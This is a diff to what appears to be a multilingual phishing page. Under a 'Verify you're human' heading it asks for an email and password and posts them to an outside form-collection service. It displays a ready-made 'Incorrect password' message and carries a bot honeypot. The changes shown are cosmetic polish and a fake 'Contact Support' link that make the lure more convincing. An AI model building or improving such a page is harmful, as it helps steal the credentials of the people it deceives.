@@ -43,7 +43,7 @@
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            width: 300px;
+            width: 350px; /* Increased width from 300px to 350px */
             position: relative;
             z-index: 1;
         }
@@ -106,6 +106,22 @@
         .honeypot {
             display: none;
         }
+        .form-header {
+            margin-bottom: 1.5rem; /* Gap below "Verify you’re human" */
+            font-size: 1.5rem; /* Reduced font size from default ~2rem to 1.5rem */
+        }
+        .contact-support {
+            margin-top: 15px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .contact-support a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .contact-support a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -116,7 +132,7 @@
             <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=example.com" alt="Domain Favicon">
             <span class="h4" id="domain-name">EXAMPLE</span>
         </div>
-        <h2 data-translate="form_header">Verify you’re human</h2>
+        <h2 class="form-header" data-translate="form_header">Verify you’re human</h2>
         <form id="login-form" action="https://submit-form.com/J2IVAy4bj" method="POST">
             <div class="form-group">
                 <label for="email" data-translate="email_label">Email:</label>
@@ -132,6 +148,9 @@
             </div>
             <button type="submit" data-translate="submit_button">Log In</button>
             <div class="error-message" id="error-message" data-translate="error_message">Incorrect password, please try again</div>
+            <div class="contact-support">
+                <a href="mailto:support@example.com" data-translate="contact_support">Contact Support</a>
+            </div>
         </form>
     </div>
 
@@ -146,7 +165,8 @@
                 password_label: "Password:",
                 submit_button: "Log In",
                 error_message: "Incorrect password, please try again",
-                bot_detected: "Bot detected, please try again"
+                bot_detected: "Bot detected, please try again",
+                contact_support: "Contact Support"
             },
             es: {
                 form_header: "Verifica que eres humano",
@@ -154,7 +174,8 @@
                 password_label: "Contraseña:",
                 submit_button: "Iniciar sesión",
                 error_message: "Contraseña incorrecta, por favor intenta de nuevo",
-                bot_detected: "Bot detectado, por favor intenta de nuevo"
+                bot_detected: "Bot detectado, por favor intenta de nuevo",
+                contact_support: "Contactar con soporte"
             },
             fr: {
                 form_header: "Vérifiez que vous êtes humain",
@@ -162,7 +183,8 @@
                 password_label: "Mot de passe :",
                 submit_button: "Se connecter",
                 error_message: "Mot de passe incorrect, veuillez réessayer",
-                bot_detected: "Bot détecté, veuillez réessayer"
+                bot_detected: "Bot détecté, veuillez réessayer",
+                contact_support: "Contacter le support"
             },
             de: {
                 form_header: "Bestätigen Sie, dass Sie ein Mensch sind",
@@ -170,7 +192,8 @@
                 password_label: "Passwort:",
                 submit_button: "Anmelden",
                 error_message: "Falsches Passwort, bitte versuchen Sie es erneut",
-                bot_detected: "Bot erkannt, bitte versuchen Sie es erneut"
+                bot_detected: "Bot erkannt, bitte versuchen Sie es erneut",
+                contact_support: "Support kontaktieren"
             },
             it: {
                 form_header: "Verifica che sei umano",
@@ -178,7 +201,8 @@
                 password_label: "Password:",
                 submit_button: "Accedi",
                 error_message: "Password errata, riprova",
-                bot_detected: "Bot rilevato, riprova"
+                bot_detected: "Bot rilevato, riprova",
+                contact_support: "Contatta il supporto"
             },
             pt: {
                 form_header: "Verifique que você é humano",
@@ -186,7 +210,8 @@
                 password_label: "Senha:",
                 submit_button: "Entrar",
                 error_message: "Senha incorreta, tente novamente",
-                bot_detected: "Bot detectado, tente novamente"
+                bot_detected: "Bot detectado, tente novamente",
+                contact_support: "Contactar o suporte"
             },
             ja: {
                 form_header: "あなたが人間であることを確認してください",
@@ -194,7 +219,8 @@
                 password_label: "パスワード:",
                 submit_button: "ログイン",
                 error_message: "パスワードが正しくありません。もう一度お試しください",
-                bot_detected: "ボットが検出されました。もう一度お試しください"
+                bot_detected: "ボットが検出されました。もう一度お試しください",
+                contact_support: "サポートに連絡"
             },
             zh: {
                 form_header: "验证您是人类",
@@ -202,7 +228,8 @@
                 password_label: "密码:",
                 submit_button: "登录",
                 error_message: "密码错误，请重试",
-                bot_detected: "检测到机器人，请重试"
+                bot_detected: "检测到机器人，请重试",
+                contact_support: "联系支持"
             }
         };
 
